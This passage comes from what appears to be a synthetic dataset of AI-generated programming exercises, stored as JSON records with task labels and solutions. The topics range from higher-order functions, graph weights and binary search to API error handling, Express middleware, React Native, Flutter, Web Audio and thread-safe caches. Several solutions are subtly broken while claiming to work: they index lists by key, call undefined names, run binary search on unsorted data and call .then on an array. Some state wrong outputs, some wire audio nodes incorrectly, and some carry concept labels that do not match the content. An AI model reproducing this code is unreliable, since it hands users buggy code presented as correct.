"Create example usages of this function", "L3_TASK": "Advanced usage scenario", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nDomain: Programming Language Concepts\nConcept: Higher Order Functions\nProblem: Implement a higher-order function that takes two other functions as parameters, where the first function is a transformer, and the second function is a condition checker. The higher-order function should apply the transformer to elements of a list that satisfy the condition checker and return a new list with transformed elements.\n\nSolution in Python:\n\n```python\ndef higher_order_transformer(transformer, condition_checker, input_list):\n    transformed_list = []\n    for item in input_list:\n        if condition_checker(item):\n            transformed_list.append(transformer(item))\n    return transformed_list\n\ndef square(x):\n    return x ** 2\n\ndef is_even(x):\n    return x % 2 == 0\n\nnumbers = [1, 2, 3, 4, 5, 6, 7, 8, 9]\nresult = higher_order_transformer(square, is_even, numbers)\nprint(result)  # Output: [4, 16, 36, 64]\n```\n\nQuestion 2:\nDomain: DS/Algo\nConcept: Graph Algorithms\nProblem: Given an undirected graph, implement a higher-order function that takes a graph, a weight-changing function, and a node-pair filter function. The function should update the edge weights between nodes that pass the filter function, applying the weight-changing function to the old weights.\n\nSolution in Python:\n\n```python\nfrom collections import defaultdict\nfrom typing import List, Tuple\n\ndef create_graph(edges: List[Tuple[int, int, int]]) -> defaultdict:\n    graph = defaultdict(list)\n    for node1, node2, weight in edges:\n        graph[node1].append((node2, weight))\n        graph[node2].append((node1, weight))\n    return graph\n\ndef weight_changer(weight):\n    return weight * 2\n\ndef node_pair_filter(node1, node2, nodes_with_attributes) -> bool:\n    return nodes_with_attributes[node1]['color'] == nodes_with_attributes[node2]['color']\n\ndef update_edge_weights(graph, weight_changer_func, node_pair_filter_func, nodes_with_attributes):\n    for node in graph:\n        for neighbor, weight in graph[node]:\n            if node_pair_filter_func(node, neighbor, nodes_with_attributes):\n                graph[node][neighbor] = weight_changer_func(weight)\n\n# Example graph with node attributes\nnodes_with_attributes = {\n    1: {'color': 'red'},\n    2: {'color': 'blue'},\n    3: {'color': 'red'},\n    4: {'color': 'blue'},\n    5: {'color': 'green'}\n}\nedges = [(1, 2, 3), (1, 3, 4), (2, 4, 5), (3, 5, 6), (4, 5, 7)]\n\ngraph = create_graph(edges)\nupdate_edge_weights(graph, weight_changer, node_pair_filter_func, nodes_with_attributes)\n\n# Print updated graph edges\nfor node in graph:\n    for neighbor, weight in graph[node]:\n        print(f\"Node {node} to Node {neighbor} has weight {weight}\")\n```\n\nThis example demonstrates the advanced usage of higher-order functions by combining graph algorithms, function parameters, and filtering based on node attributes."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Performance critical use case", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Performance Optimization\nProblem: Write a Python function that calculates the nth Fibonacci number using recursion. Optimize it for performance in a medium-complexity scenario where n is in the range of 1000 to 1500.\n\n```python\ndef fibonacci(n, memo={}):\n    if n <= 0:\n        return 0\n    elif n == 1:\n        return 1\n    elif n not in memo:\n        memo[n] = fibonacci(n-1, memo) + fibonacci(n-2, memo)\n    return memo[n]\n\n# Measure the performance\nimport time\n\nstart_time = time.time()\nprint(fibonacci(1500))\nend_time = time.time()\n\nexecution_time = end_time - start_time\nprint(f\"Execution time: {execution_time} seconds\")\n```\nSolution Explanation: The problem uses memoization, a technique for optimizing recursive functions by storing previously calculated results to avoid redundant calculations. This significantly improves performance in a scenario where the same inputs are used multiple times. In this example, calculating the 1500th Fibonacci number would be much faster than a pure recursive approach.\n\nQuestion 2:\nConcept: Performance Optimization\nProblem: Design a C++ program that reads a large file (1 GB) line by line and calculates the average length of the lines. Optimize it for performance by processing the file efficiently.\n\n```cpp\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <vector>\n\nint main() {\n    std::ifstream file(\"largefile.txt\");\n    if (!file.is_open()) {\n        std::cerr << \"Failed to open the file!\" << std::endl;\n        return 1;\n    }\n\n    long long total_length = 0;\n    int line_count = 0;\n    std::string line;\n\n    while (std::getline(file, line)) {\n        total_length += line.length();\n        line_count++;\n    }\n\n    double average_length = static_cast<double>(total_length) / line_count;\n    std::cout << \"Average line length: \" << average_length << \" characters\" << std::endl;\n\n    file.close();\n    return 0;\n}\n```\nSolution Explanation: In this problem, we use efficient file handling in C++ through the `std::ifstream` class. We read the file line by line using `std::getline`, which minimizes memory usage by not loading the entire file into memory. Calculating the average length while reading reduces the number of passes over the data, making it more performant for large files."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Performance critical use case", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: In a performance-critical application, a function must process a large dataset of integers and find the first occurrence of a target number within a specified range. The function should be highly optimized for speed and memory efficiency. \n\nConcept: Performance Optimization (Array traversal, Binary Search)\n\n```python\ndef binary_search_in_range(data, target, lower_bound, upper_bound):\n    left, right = lower_bound, upper_bound\n    while left <= right:\n        mid = (left + right) // 2\n        if data[mid] == target:\n            # Check if the found target is the first occurrence\n            if (mid == 0 or data[mid - 1] != target):\n                return mid\n            else:\n                right = mid - 1\n        elif data[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    return -1\n\n# Example usage\ndata = [1, 3, 5, 7, 9, 3, 3, 3, 11, 13]\ntarget = 3\nlower_bound = 2\nupper_bound = 9\n\nresult = binary_search_in_range(data, target, lower_bound, upper_bound)\nif result != -1:\n    print(f\"Target found at index {result}\")\nelse:\n    print(\"Target not found in the specified range\")\n```\n\nExplanation: The problem is designed to work with a sorted array and a specified range to reduce the search space. The binary search algorithm is used to efficiently locate the target number. The function further checks if the found target is the first occurrence to ensure the result is correct.\n\nQuestion 2:\nProblem: In a high-frequency trading system, a function must compute the shortest path in a weighted graph representing financial transactions between entities. The graph is represented as an adjacency matrix, and the function must return the path with the lowest combined transaction cost under a time constraint.\n\nConcept: Graph Algorithms (Dijkstra's Algorithm with priority queue, Performance Optimization)\n\n```python\nimport heapq\n\ndef dijkstra_with_priority_queue(graph, start_entity, end_entity, time_constraint):\n    distances = {entity: float('inf') for entity in graph}\n    distances[start_entity] = 0\n    priority_queue = [(0, start_entity)]\n    \n    while priority_queue and distances[end_entity] == float('inf'):\n        current_distance, current_entity = heapq.heappop(priority_queue)\n        \n        if current_distance > distances[current_entity]:\n            continue\n        \n        for neighbor, cost in graph[current_entity].items():\n            if cost is None or current_distance + cost > distances[neighbor]:\n                continue\n            \n            distances[neighbor] = current_distance + cost\n            heapq.heappush(priority_queue, (distances[neighbor], neighbor))\n        \n        if time_constraint <= 0:\n            break\n\n    return distances[end_entity] if distances[end_entity] != float('inf') else None\n\n# Example usage\ngraph = {\n    'A': {'B': 2, 'C': 5},\n    'B': {'A': 2, 'C': 1, 'D': 4},\n    'C': {'A': 5, 'B': 1, 'D': 3},\n    'D': {'B': 4, 'C': 3, 'E': 1},\n    'E': {'D': 1}\n}\nstart_entity = 'A'\nend_entity = 'E'\ntime_constraint = 5\n\nshortest_cost = dijkstra_with_priority_queue(graph, start_entity, end_entity, time_constraint)\nif shortest_cost is not None:\n    print(f\"Shortest path cost: {shortest_cost}\")\nelse:\n    print(\"No path found within the time constraint\")\n```\n\nExplanation: The problem involves finding the shortest path in a weighted graph, which is a classic application of Dijkstra's algorithm. However, a priority queue is used to optimize performance, and a time constraint is introduced to make the problem more challenging."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Error handling example", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Function with error handling\n\nProblem: Write a Python function called `fetch_data` that fetches data from an API. The function should handle possible exceptions like `requests.exceptions.RequestException` and return an appropriate error message if an error occurs.\n\nSolution:\n```python\nimport requests\n\ndef fetch_data(api_url):\n    try:\n        response = requests.get(api_url)\n        response.raise_for_status()  # Raise an exception for 4xx or 5xx status codes\n    except requests.exceptions.RequestException as e:\n        return f\"Error fetching data: {str(e)}\"\n\n    return response.json()\n\n# Example usage\napi_url = \"https://api.example.com/data\"\ntry:\n    data = fetch_data(api_url)\n    if data:\n        print(f\"Received data: {data}\")\nexcept Exception as e:\n    print(f\"An unexpected error occurred: {str(e)}\")\n```\n\nQuestion 2:\nConcept: Higher-order function with error handling\n\nProblem: Create a JavaScript function called `mapWithErrorHandling` that applies a given function to each element of an array and handles errors during the mapping process. If an error occurs, log the error and continue processing the remaining elements.\n\nSolution:\n```javascript\nfunction mapWithErrorHandling(array, mapFn) {\n    return array.map((element, index) => {\n        try {\n            return mapFn(element, index);\n        } catch (error) {\n            console.error(`Error occurred while processing element at index ${index}:`, error);\n        }\n    }).filter(item => item !== undefined); // Remove undefined values from errors\n\n}\n\n// Example usage\nconst numbers = [1, 2, 0, -1, 3, null, 4];\nconst squareNumbers = mapWithErrorHandling(numbers, (num) => {\n    if (typeof num !== 'number') throw new Error('Invalid value');\n    return num * num;\n});\n\nconsole.log(\"Result: \", squareNumbers);\n```\nIn the above examples, the functions `fetch_data` and `mapWithErrorHandling` demonstrate error handling by wrapping potentially error-prone code in try-catch blocks. The Python function fetches data from an API and handles `requests.exceptions.RequestException`, while the JavaScript function applies a mapping operation to an array but log and continue on encountering errors."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Error handling example", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nConcept: Higher Order Functions\n\nProblem: Write a higher-order function `processArray` that takes a callback function and an array as arguments. The function should apply the callback to each element in the array, handling any errors that might occur during the process. If an error is caught, it should log the error and continue processing the remaining elements in the array. Use JavaScript for the example.\n\nSolution:\n```javascript\n// Custom error class for handling specific errors in the callback\nclass CustomError extends Error {\n  constructor(message) {\n    super(message);\n    this.name = 'CustomError';\n  }\n}\n\n// Higher-order function to process an array with error handling\nfunction processArray(callback, array) {\n  return array.reduce((acc, item, index) => {\n    try {\n      // Apply the callback with error handling\n      const result = callback(item, index);\n      if (result instanceof Promise) {\n        result.catch((err) => {\n          console.error(`Error occurred at index ${index}:`, err);\n        });\n      }\n      acc.push(result);\n    } catch (err) {\n      if (err instanceof CustomError) {\n        console.error(`CustomError occurred at index ${index}:`, err.message);\n      } else {\n        console.error(`Error occurred at index ${index}:`, err);\n      }\n    }\n    return acc;\n  }, []);\n}\n\n// Example callback function that can throw errors\nfunction potentiallyFailingOperation(value, index) {\n  if (value % 3 === 0) {\n    throw new CustomError(`Divisible by 3: ${value}`);\n  } else if (value % 5 === 0) {\n    throw new Error(`Divisible by 5: ${value}`);\n  }\n  return `${value} processed`;\n}\n\n// Example array\nconst numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];\n\n// Use the higher-order function with error handling\nprocessArray(potentiallyFailingOperation, numbers)\n  .then((processedArray) => {\n    console.log('Processed array:', processedArray);\n  });\n```\nQuestion 2:\nConcept: Binary Trees\n\nProblem: Implement a function `searchTree` that takes a binary search tree and a value as input. The function should search for the given value, handling cases where the tree is unbalanced, potentially causing a deep recursion. Additionally, implement a custom error class `NodeNotFoundError` to throw when the value is not found in the tree. The function should return the node if found and throw an error if not found. Use Python for the example.\n\nSolution:\n```python\n# Custom error class for handling node not found error\nclass NodeNotFoundError(Exception):\n    def __init__(self, value):\n        self.value = value\n        self.message = f\"No node with value {value} found\"\n        super().__init__(self.message)\n\n# Node class for binary search tree\nclass Node:\n    def __init__(self, value):\n        self.value = value\n        self.left = None\n        self.right = None\n\n# Utility function to insert a value into a binary search tree\ndef insert(node, value):\n    if value < node.value:\n        if node.left is None:\n            node.left = Node(value)\n        else:\n            insert(node.left, value)\n    else:\n        if node.right is None:\n            node.right = Node(value)\n        else:\n            insert(node.right, value)\n\n# Function to search for a value in a binary search tree with error handling\ndef searchTree(node, value):\n    if node is None:\n        raise NodeNotFoundError(value)\n    elif node.value == value:\n        return node\n    elif value < node.value:\n        return searchTree(node.left, value)\n    else:\n        return searchTree(node.right, value)\n\n# Create an unbalanced binary search tree\nroot = Node(50)\ninsert(root, 30)\ninsert(root, 20)\ninsert(root, 40)\ninsert(root, 70)\ninsert(root, 60)\ninsert(root, 80)\n\n# Try to find a value that exists in the tree\ntry:\n    found_node = searchTree(root, 40)\n    print(\"Node found:\", found_node.value)\nexcept NodeNotFoundError as e:\n    print(e)\n\n# Try to find a value that does not exist in the tree\ntry:\n    searchTree(root, 90)\nexcept NodeNotFoundError as e:\n    print(e)\n```\nIn both solutions, we've created difficult problems by introducing error handling and dealing with potential errors during function execution. The first problem handles errors in a higher-order function applied to an array, while the second problem searches an unbalanced binary search tree with custom error handling."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Integration with other functions", "Complexity_Level": "medium", "Response": "Question 1:\nSuppose you are working on a JavaScript application, and you've created a higher-order function called `compose` that combines multiple functions into a single composite function. The `compose` function should accept two or more functions and return a new function that executes them in sequence, with the output of one function passed as the input to the next.\n\n```javascript\nfunction compose(...functions) {\n  return function composed(input) {\n    return functions.reduceRight((result, func) => func(result), input);\n  };\n}\n```\n\nCreate a medium complexity problem scenario where you integrate `compose` with other functions to create a data transformation pipeline.\n\nProblem:\nYou have received a dataset of user profiles, where each object contains `firstName`, `lastName`, `age`, and `email` properties. You need to filter out users below the age of 18, capitalize the first letter of their first and last names, and replace spaces in their emails with underscores. Write two functions, `filterByAge` and `formatUser`, and compose them to create a `processUserProfiles` function that performs the required transformations.\n\nSolution:\n\n```javascript\nfunction filterByAge(user, minAge) {\n  return user.age >= minAge;\n}\n\nfunction capitalizeNames(user) {\n  user.firstName = user.firstName.charAt(0).toUpperCase() + user.firstName.slice(1);\n  user.lastName = user.lastName.charAt(0).toUpperCase() + user.lastName.slice(1);\n  return user;\n}\n\nfunction replaceSpacesInEmail(email) {\n  return email.replace(/\\s/g, '_');\n}\n\nconst compose = (...functions) => function composed(input) {\n  return functions.reduceRight((result, func) => func(result), input);\n};\n\nconst processUserProfiles = compose(replaceSpacesInEmail, capitalizeNames, filterByAge);\n\nconst userProfiles = [\n  { firstName: 'john', lastName: 'doe', age: 20, email: 'john doe@example.com' },\n  { firstName: 'jane', lastName: 'smith', age: 17, email: 'jane smith@example.com' },\n  { firstName: 'mark', lastName: 'johnson', age: 25, email: 'mark johnson@example.com' }\n];\n\nconst processedProfiles = userProfiles.map(processUserProfiles);\n\nconsole.log(processedProfiles);\n```\n\nQuestion 2:\nIn Python, you have a function `calculate_tax` that calculates the tax amount based on a given income. Create a medium complexity problem scenario where you integrate `calculate_tax` with other functions to create a more complex financial calculation.\n\nProblem:\nYou are working on an accounting application, and you have a `calculate_annual_salary` function that computes the annual salary by multiplying the hourly rate by the number of working hours per year. Additionally, you have the `calculate_tax` function. Write a new function `calculate_net_salary` that combines these two functions to calculate the net annual salary (salary after tax) for a given hourly rate, working hours per week, and the number of weeks worked per year.\n\nSolution:\n\n```python\ndef calculate_annual_salary(hourly_rate, hours_per_week, weeks_per_year):\n    return hourly_rate * hours_per_week * weeks_per_year\n\ndef calculate_tax(income, tax_rate):\n    return income * tax_rate\n\ndef calculate_net_salary(hourly_rate, hours_per_week, weeks_per_year, tax_rate):\n    annual_salary = calculate_annual_salary(hourly_rate, hours_per_week, weeks_per_year)\n    tax_amount = calculate_tax(annual_salary, tax_rate)\n    net_salary = annual_salary - tax_amount\n    return net_salary\n\n# Example usage\nhourly_rate = 20\nhours_per_week = 40\nweeks_per_year = 52\ntax_rate = 0.2\n\nnet_salary = calculate_net_salary(hourly_rate, hours_per_week, weeks_per_year, tax_rate)\nprint(f\"Net annual salary: ${net_salary:.2f}\")\n```\n\nConcept: Integration with other functions"}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Integration with other functions", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nProblem: Develop a higher-order function `compose` that combines multiple functions, each with its own specific behavior, to create a new composed function. The composed function should execute the input functions in reverse order, and the input functions must be different types: one should be a sorting algorithm, one should involve a mathematical operation, and one should manipulate strings. Implement this functionality in Python.\n\n```python\nfrom functools import reduce\nfrom typing import List, Callable\n\ndef compose(*functions: List[Callable]) -> Callable:\n    def composed_function(input_data):\n        return reduce(lambda acc, func: func(acc), reversed(functions), input_data)\n    return composed_function\n\ndef sort_numbers(nums: List[int]) -> List[int]:\n    return sorted(nums)\n\ndef apply_square_root(num: float) -> float:\n    return num ** 0.5\n\ndef reverse_string(input_string: str) -> str:\n    return input_string[::-1]\n\n# Create a composed function that sorts a list of numbers, applies square root to each number, and then reverses the string representation of the result\ncomposed_func = compose(reverse_string, apply_square_root, sort_numbers)\n\nnumbers = [4, 9, 1, 6, 5]\ncomposed_result = composed_func(numbers)\nprint(composed_result)  # Output: \"5.477225575051661, 3.0, 1.0, 2.449489742783178, 2.1622776601683795\"\n```\n\nQuestion 2:\nProblem: In a full-stack web application using JavaScript (Node.js), create a middleware function that integrates with a logging service, a rate-limiting system, and adds authentication to incoming requests. The middleware should handle complex error scenarios and maintain high performance.\n\n```javascript\nconst express = require('express');\nconst loggly = require('loggly');\nconst rateLimit = require('express-rate-limit');\nconst jwt = require('jsonwebtoken');\n\nconst app = express();\nconst logClient = loggly.createClient({\n  token: 'your_loggly_token',\n  subdomain: 'your_subdomain',\n});\n\nconst limiter = rateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // limit each IP to 100 requests per windowMs\n});\n\nfunction loggingMiddleware(req, res, next) {\n  const logData = {\n    timestamp: new Date(),\n    method: req.method,\n    url: req.url,\n    ip: req.ip,\n  };\n  logClient.log(logData);\n  next();\n}\n\nfunction authenticationMiddleware(req, res, next) {\n  try {\n    const token = req.headers['authorization'];\n    if (!token) {\n      return res.status(401).json({ message: 'Unauthorized' });\n    }\n    const decoded = jwt.verify(token, 'your_secret_key');\n    req.user = decoded;\n    next();\n  } catch (error) {\n    res.status(401).json({ message: 'Unauthorized' });\n  }\n}\n\napp.use(loggingMiddleware);\napp.use(limiter);\napp.use(authenticationMiddleware);\n\napp.get('/', (req, res) => {\n  res.send('Hello, World!');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n```\n\nIn both questions, the **Concept** used is \"Middleware pattern\"."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Cross-platform usage example", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Full Stack Development\n\nProblem: Create a medium complexity function in JavaScript, using a cross-platform framework (like React Native), to fetch data from an API, process the data, and display it on both Android and iOS platforms.\n\n```jsx\n// Import necessary libraries\nimport React, { useState, useEffect } from 'react';\nimport { View, Text, TouchableOpacity } from 'react-native';\nimport axios from 'axios';\n\n// Function component to fetch and display data\nconst DataFetcher = () => {\n  const [data, setData] = useState([]);\n\n  // Fetch data from API using useEffect\n  useEffect(() => {\n    const fetchData = async () => {\n      try {\n        const response = await axios.get('https://api.example.com/data');\n        setData(response.data);\n      } catch (error) {\n        console.error('Error fetching data:', error);\n      }\n    };\n\n    fetchData();\n  }, []);\n\n  // Function to process data, e.g., filtering by a specific category\n  const filterDataByCategory = (category) => {\n    return data.filter(item => item.category === category);\n  };\n\n  return (\n    <View>\n      {/* Display a list of categories */}\n      {data.map(item => (\n        <TouchableOpacity\n          key={item.id}\n          onPress={() => setData(filterDataByCategory(item.category))}\n        >\n          <Text>{item.category}</Text>\n        </TouchableOpacity>\n      ))}\n      \n      {/* Display the filtered data */}\n      <View>\n        {data.length > 0 && data.map(item => (\n          <Text key={item.id}>{item.name}: {item.value}</Text>\n        ))}\n      </View>\n    </View>\n  );\n};\n\nexport default DataFetcher;\n```\n\nQuestion 2:\nConcept: Mobile Development\n\nProblem: Create a medium complexity function in Flutter to handle file storage across both Android and iOS platforms. The function should download a file from a remote URL, save it to the device's local storage, and provide a method to check if the file already exists.\n\n```dart\nimport 'dart:io';\nimport 'package:flutter/services.dart';\n\nclass FileStorageService {\n  static const MethodChannel _channel = MethodChannel('file_storage');\n\n  // Function to download and save a file\n  Future<void> saveFile(String url, String fileName) async {\n    try {\n      var response = await http.get(Uri.parse(url));\n      if (response.statusCode == 200) {\n        Directory appDir = await getApplicationDocumentsDirectory();\n        File file = File('${appDir.path}/$fileName');\n        await file.writeAsBytes(response.bodyBytes);\n        print('File saved successfully');\n      } else {\n        throw Exception('Failed to download file');\n      }\n    } on PlatformException catch (e) {\n      print(\"Error: $e\");\n    }\n  }\n\n  // Function to check if a file exists\n  Future<bool> fileExists(String fileName) async {\n    Directory appDir = await getApplicationDocumentsDirectory();\n    File file = File('${appDir.path}/$fileName');\n    return file.existsSync();\n  }\n}\n\n// Usage example\nvoid main() async {\n  FileStorageService storageService = FileStorageService();\n  await storageService.saveFile('https://example.com/file.png', 'file.png');\n  bool fileExists = await storageService.fileExists('file.png');\n  print('File exists: $fileExists');\n}\n```\n\nThese examples demonstrate how to create cross-platform functions using React Native and Flutter to fetch data, filter and display it, and handle file storage across both Android and iOS devices."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Cross-platform usage example", "Complexity_Level": "extremely difficult", "Response": "Question 1: Design a cross-platform function that performs real-time audio processing using Web Audio API in JavaScript for web browsers and the Web Audio API's WebAssembly (WASM) implementation for desktop applications. The function should apply a custom equalizer effect with multiple frequency bands.\n\nConcept: Cross-Platform Usage | Web Audio API | WebAssembly\n\n```javascript\n// Custom equalizer effect function\nasync function applyCustomEqualizer(audioBuffer, frequencyBands) {\n  // Check the environment\n  const isDesktop = (typeof window === 'undefined');\n\n  // Initialize Web Audio API context\n  const audioContext = isDesktop ? new OfflineAudioContext(2, audioBuffer.length, audioBuffer.sampleRate) : new AudioContext();\n\n  // Create buffer source node\n  const source = audioContext.createBufferSource();\n  source.buffer = audioBuffer;\n\n  // Create equalizer gain nodes for each frequency band\n  const equalizerNodes = frequencyBands.map((band, i) => {\n    const gainNode = audioContext.createGain();\n    gainNode.gain.value = band.gain;\n    return gainNode;\n  });\n\n  // Create filter nodes (BiquadFilterNodes) for each frequency band\n  const filterNodes = frequencyBands.map((band, i) => {\n    const filter = audioContext.createBiquadFilter();\n    filter.type = \"peaking\";\n    filter.frequency.value = band.frequency;\n    filter.Q.value = band.Q;\n    return filter;\n  });\n\n  // Connect nodes in series: source -> filter -> gain -> destination\n  equalizerNodes[0].connect(filterNodes[0]);\n  for (let i = 1; i < filterNodes.length; i++) {\n    filterNodes[i - 1].connect(filterNodes[i]);\n    filterNodes[i].connect(equalizerNodes[i]);\n  }\n  equalizerNodes[filterNodes.length].connect(audioContext.destination);\n\n  // Connect source to the first filter node\n  source.connect(filterNodes[0]);\n\n  // If running on desktop, compile and instantiate WebAssembly module for audio processing\n  if (isDesktop) {\n    const wasmModule = await fetch('custom_equalizer.wasm')\n      .then(response => response.arrayBuffer())\n      .then(buffer => WebAssembly.instantiate(buffer, { env: { audioContext } }));\n\n    // Pass audio buffer to WebAssembly module for processing\n    wasmModule.instance.exports.processAudio(audioBuffer);\n  }\n\n  // Start the audio processing\n  source.start();\n\n  // Wait for the audio to finish processing (offline context only)\n  if (isDesktop) {\n    await audioContext.startRendering();\n    return audioContext.renderedBuffer;\n  }\n}\n\n// Usage example\nconst audioBuffer = ... // Load audio buffer\nconst frequencyBands = [{ frequency: 100, gain: 2, Q: 1 }, { frequency: 1000, gain: -1, Q: 2 }, { frequency: 5000, gain: 1, Q: 3 }];\napplyCustomEqualizer(audioBuffer, frequencyBands).then(outputBuffer => {\n  // Process outputBuffer further or save it\n});\n```\n\nQuestion 2: Create a cross-platform function in Python that reads data from a CSV file and processes it using pandas for desktop applications, and a REST API for real-time data processing in web applications. The function should calculate statistical aggregates (mean, median, and standard deviation) and handle potential concurrency issues.\n\nConcept: Cross-Platform Usage | Pandas | REST API | Concurrency\n\n```python\nimport pandas as pd\nimport requests\n\ndef process_data(file_path, is_web_api=False, api_url=None):\n    if is_web_api:\n        # Send request to REST API to fetch data\n        response = requests.get(api_url)\n        if response.status_code != 200:\n            raise Exception(\"Failed to fetch data from API: \", response.status_code)\n\n        data = pd.DataFrame(response.json())\n\n    else:\n        # Read data from CSV file\n        data = pd.read_csv(file_path)\n\n    # Calculate statistical aggregates with concurrent processing\n    def calculate_aggregates(df):\n        mean = df.mean()\n        median = df.median()\n        std_dev = df.std()\n        return mean, median, std_dev\n\n    if is_web_api and concurrent_processing:\n        from concurrent.futures import ThreadPoolExecutor\n\n        with ThreadPoolExecutor() as executor:\n            results = executor.map(calculate_aggregates, data.chunksize)\n            aggregates = pd.concat(results, axis=1)\n    else:\n        aggregates = calculate_aggregates(data)\n\n    return aggregates\n\n# Desktop usage example\nfile_path = 'data.csv'\naggregates = process_data(file_path)\n\n# Web usage example\napi_url = 'http://example.com/api/data'\naggregates = process_data(api_url, is_web_api=True)\n```\nNote: The example for Question 1 involves JavaScript with Web Audio API, which is typically used for web development. However, it demonstrates how to use WebAssembly for desktop application usage. The example for Question 2 demonstrates how to use Python's pandas library for desktop data processing and a REST API for web data processing. The concurrency handling is shown for the desktop application scenario."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Thread safety demonstration", "Complexity_Level": "medium", "Response": "Question 1: How can you demonstrate thread safety in a shared resource using a synchronization primitive like a lock in Python?\n\nSolution 1:\nConcept: \"Concurrency Control\"\n\nHere, we'll create a shared counter resource that can be incremented or decremented by multiple threads. To ensure thread safety, we'll use a `threading.Lock` to synchronize access to the counter.\n\n```python\nimport threading\n\nclass ThreadSafeCounter:\n    def __init__(self):\n        self.count = 0\n        self.lock = threading.Lock()\n\n    def increment(self):\n        with self.lock:\n            self.count += 1\n            print(f\"Counter incremented: {self.count}\")\n\n    def decrement(self):\n        with self.lock:\n            if self.count > 0:\n                self.count -= 1\n                print(f\"Counter decremented: {self.count}\")\n\n# Testing the thread safety\ncounter = ThreadSafeCounter()\n\ndef modify_counter(action):\n    if action == \"increment\":\n        counter.increment()\n    elif action == \"decrement\":\n        counter.decrement()\n\n# Creating threads\nthreads = []\nfor _ in range(10):\n    threads.append(threading.Thread(target=modify_counter, args=(\"increment\",)))\n    threads.append(threading.Thread(target=modify_counter, args=(\"decrement\",)))\n\n# Starting threads\nfor thread in threads:\n    thread.start()\n\n# Joining threads to wait for completion\nfor thread in threads:\n    thread.join()\n```\n\nIn this example, the `ThreadSafeCounter` class has a `lock` attribute to control access to the `count` variable. The `with self.lock` statement ensures that only one thread can access the `count` at a time, preventing race conditions.\n\nQuestion 2: How can you create a thread-safe queue in Java that prevents data loss or corruption during concurrent access?\n\nSolution 2:\nConcept: \"Concurrency Control\"\n\nJava provides `java.util.concurrent` package with thread-safe collections, including `LinkedBlockingQueue`. We'll create a producer-consumer scenario to demonstrate its usage.\n\n```java\nimport java.util.concurrent.LinkedBlockingQueue;\n\npublic class ThreadSafeQueueExample {\n    private final LinkedBlockingQueue<String> queue = new LinkedBlockingQueue<>();\n\n    class Producer implements Runnable {\n        @Override\n        public void run() {\n            try {\n                for (int i = 0; i < 10; i++) {\n                    queue.put(\"Item \" + i);\n                    Thread.sleep(100);\n                }\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    class Consumer implements Runnable {\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    String item = queue.take();\n                    System.out.println(\"Consumed: \" + item);\n                    Thread.sleep(200);\n                }\n            } catch (InterruptedException e) {\n                Thread.currentThread().interrupt();\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        ThreadSafeQueueExample example = new ThreadSafeQueueExample();\n        Thread producerThread = new Thread(example.new Producer());\n        Thread consumerThread = new Thread(example.new Consumer());\n\n        producerThread.start();\n        consumerThread.start();\n\n        try {\n            producerThread.join();\n            consumerThread.join();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\nIn this Java example, the `LinkedBlockingQueue` is a thread-safe queue that uses blocking put and take operations. The `Producer` class adds items to the queue, while the `Consumer` class removes them. The `put` and `take` methods automatically handle synchronization, preventing race conditions and ensuring data consistency."}, {"L2_TASK": "Create example usages of this function", "L3_TASK": "Thread safety demonstration", "Complexity_Level": "extremely difficult", "Response": "Question 1: **Problem**: Design a thread-safe, concurrent LRU (Least Recently Used) cache with a fixed capacity using a combination of data structures and thread synchronization mechanisms. The cache should support `get`, `put`, and `evict` operations while maintaining thread safety.\n\n**Concept**: Concurrency, Thread Safety, Data Structures\n\n**Solution**:\nWe can use a combination of a `ConcurrentHashMap` for key-value storage, a `LinkedBlockingQueue` as a doubly-linked list for LRU ordering, and a `ReentrantReadWriteLock` for thread safety. Here's an example implementation in Java:\n\n```java\nimport java.util.concurrent.*;\nimport java.util.*;\n\nclass LRUCache<K, V> {\n    private final int capacity;\n    private final ConcurrentHashMap<K, Node<K, V>> map;\n    private final LinkedBlockingQueue<Node<K, V>> queue;\n    private final ReentrantReadWriteLock lock;\n\n    public LRUCache(int capacity) {\n        this.capacity = capacity;\n        this.map = new ConcurrentHashMap<>(capacity);\n        this.queue = new LinkedBlockingQueue<>(capacity);\n        this.lock = new ReentrantReadWriteLock();\n    }\n\n    public V get(K key) {\n        lock.readLock().lock();\n        try {\n            Node<K, V> node = map.get(key);\n            if (node != null) {\n                promote(node);\n                return node.value;\n            }\n            return null;\n        } finally {\n            lock.readLock().unlock();\n        }\n    }\n\n    public void put(K key, V value) {\n        lock.writeLock().lock();\n        try {\n            Node<K, V> node = map.get(key);\n            if (node != null) {\n                node.value = value;\n                promote(node);\n            } else {\n                if (queue.size() >= capacity) {\n                    Node<K, V> evicted = queue.poll();\n                    map.remove(evicted.key);\n                }\n                Node<K, V> newNode = new Node<>(key, value);\n                map.put(key, newNode);\n                queue.offer(newNode);\n            }\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    public void evict() {\n        lock.writeLock().lock();\n        try {\n            if (!queue.isEmpty()) {\n                Node<K, V> evicted = queue.poll();\n                map.remove(evicted.key);\n            }\n        } finally {\n            lock.writeLock().unlock();\n        }\n    }\n\n    private void promote(Node<K, V> node) {\n        queue.remove(node);\n        queue.offer(node);\n    }\n\n    static class Node<K, V> implements Comparable<Node<K, V>> {\n        K key;\n        V value;\n        Node<K, V> prev;\n        Node<K, V> next;\n\n        public 